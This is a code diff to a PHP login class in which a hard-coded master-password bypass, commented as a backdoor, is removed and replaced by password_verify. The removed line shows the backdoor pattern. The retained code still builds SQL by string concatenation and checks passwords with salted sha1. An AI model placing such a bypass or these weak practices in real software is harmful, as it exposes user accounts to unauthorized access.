@@ -153,17 +153,14 @@ class Sentry extends SystemComponent {
 		}
 
 		if (count($erreurs) === 0)
-		{
-			
+		{			
 			$sql = "
 			SELECT idPersonne, pseudo, mot_de_passe, cookie, session, ip, groupe, nom, prenom, region, email, gds
 			FROM personne
 			WHERE pseudo = '".$connector->sanitize($user)."' AND groupe <= ".$group." AND statut='actif'";
 		
 			$getUser = $connector->query($sql);
-
-			
-			
+		
 			if ($connector->getNumRows($getUser) == 1)
 			{
 				$this->userdata = $connector->fetchArray($getUser);
@@ -172,11 +169,7 @@ class Sentry extends SystemComponent {
 				if ($this->userdata['groupe'] == 1)
 					$goodRedirect = "admin/index.php";
 				
-				//echo $this->userdata['mot_de_passe'];
-				
-				
-				//Si au moins un enregistrement de personne est trouvé
-				if ((sha1($this->userdata['gds'].sha1($pass)) == $this->userdata['mot_de_passe']) || $pass == MASTER_KEY) // backdoor
+				if ((sha1($this->userdata['gds'].sha1($pass)) == $this->userdata['mot_de_passe']) || password_verify($pass, $this->userdata['mot_de_passe']))
 				{
 
 					$this->_setSession($this->userdata, $memoriser);
@@ -184,9 +177,6 @@ class Sentry extends SystemComponent {
 
 					if ($goodRedirect)
 					{
-						// redirectione vers l'URL $index.
-						
-						//header("refresh: 1; url=".$goodRedirect);
 						header("Location: ".$goodRedirect);
 						exit();
 					}
